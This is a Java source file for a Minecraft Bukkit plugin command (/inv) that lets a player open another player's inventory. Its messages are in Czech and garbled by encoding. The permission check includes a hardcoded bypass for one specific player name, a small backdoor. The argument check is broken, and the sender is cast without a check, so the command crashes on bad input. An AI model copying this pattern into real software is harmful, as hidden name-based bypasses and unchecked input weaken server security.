package cz.dinohd.bs.prikazy;

import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class InvCommand implements CommandExecutor {
	

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String arg, String[] args) {
		Player p = (Player) sender;
		Player op = Bukkit.getPlayerExact(args[0]);
		if (args.length < 0 || args.length >= 2) {
			p.sendMessage("�cNedostate�n� argumenty! /inv <hr��>");
		} else {
		if (p.hasPermission("system.inv") || p.getName().equals("iTzDinikCZ")) {
		p.openInventory(op.getInventory());
		p.sendMessage("�aOtev�r�m invent�� hr��e " + op.getName());
		} else {
			p.sendMessage("�cNem� povolen� na tento p��kaz.");
			p.damage(0);
			p.playSound(p.getLocation(), Sound.ENTITY_BLAZE_DEATH, 1, 1);
		return false;
	}
		return false;
}
		return false;
}
}